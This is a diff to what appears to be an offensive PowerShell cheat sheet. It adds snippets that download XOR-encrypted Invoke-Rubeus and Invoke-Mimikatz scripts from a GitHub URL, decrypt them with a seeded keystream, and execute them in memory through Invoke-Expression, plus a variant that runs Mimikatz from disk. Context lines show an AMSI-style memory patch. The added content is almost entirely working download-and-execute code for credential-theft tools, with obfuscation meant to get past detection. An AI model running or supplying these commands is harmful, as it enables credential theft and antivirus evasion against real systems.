@@ -61,7 +61,7 @@ $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
 
 
 # Payload encryption/decryption
-## Encryption (not secure)
+## Encryption (cryptographically insecure)
 ```powershell
 $FileIn = "C:\Windows\System32\calc.exe"
 $FileOut = "C:\calc.exe.encrypted"
@@ -92,6 +92,50 @@ for($i=0;$i -lt $Bytes.Length;$i++)
 }
 
 [io.file]::WriteAllBytes($FileOut,$Bytes)
+```
+
+### Decrypt and invoke Invoke-Rubeus.ps1 in PowerShell
+```powershell
+$Bytes = (New-Object Net.WebClient).DownloadData('https://github.com/okazymyrov/piki/blob/master/Invoke-Rubeus.ps1.encrypted?raw=true')
+$Seed = 42 # seed between 0 and 2147483647
+
+Get-Random -SetSeed $Seed -Maximum 255 -Minimum 0
+for($i=0;$i -lt $Bytes.Length;$i++)
+{
+    $Bytes[$i] = $Bytes[$i] -bxor (Get-Random -Maximum 256 -Minimum 0)
+}
+
+Invoke-Expression $([System.Text.Encoding]::ASCII.GetString($Bytes))
+```
+
+### Decrypt and invoke Invoke-Mimikatz.ps1 in PowerShell
+```powershell
+$Bytes = (New-Object Net.WebClient).DownloadData('https://github.com/okazymyrov/piki/blob/master/Invoke-Mimikatz.ps1.encrypted?raw=true')
+$Seed = 42 # seed between 0 and 2147483647
+
+Get-Random -SetSeed $Seed -Maximum 255 -Minimum 0
+for($i=0;$i -lt $Bytes.Length;$i++)
+{
+    $Bytes[$i] = $Bytes[$i] -bxor (Get-Random -Maximum 256 -Minimum 0)
+}
+
+Invoke-Expression $([System.Text.Encoding]::ASCII.GetString($Bytes))
+```
+
+### Decrypt and invoke Invoke-Mimikatz.ps1 from the disk
+```powershell
+$FileIn = "C:\Users\Administrator\Downloads\Invoke-Mimikatz.ps1.encrypted"
+$Seed = 42 # seed between 0 and 2147483647
+
+$Bytes = [io.file]::ReadAllBytes($FileIn) # Get-Content -Path $File -Encoding byte -Raw 
+
+Get-Random -SetSeed $Seed -Maximum 255 -Minimum 0
+for($i=0;$i -lt $Bytes.Length;$i++)
+{
+    $Bytes[$i] = $Bytes[$i] -bxor (Get-Random -Maximum 256 -Minimum 0)
+}
+
+Invoke-Expression $([System.Text.Encoding]::ASCII.GetString($Bytes))
 ```
 
 # How to grep in PowerShell 
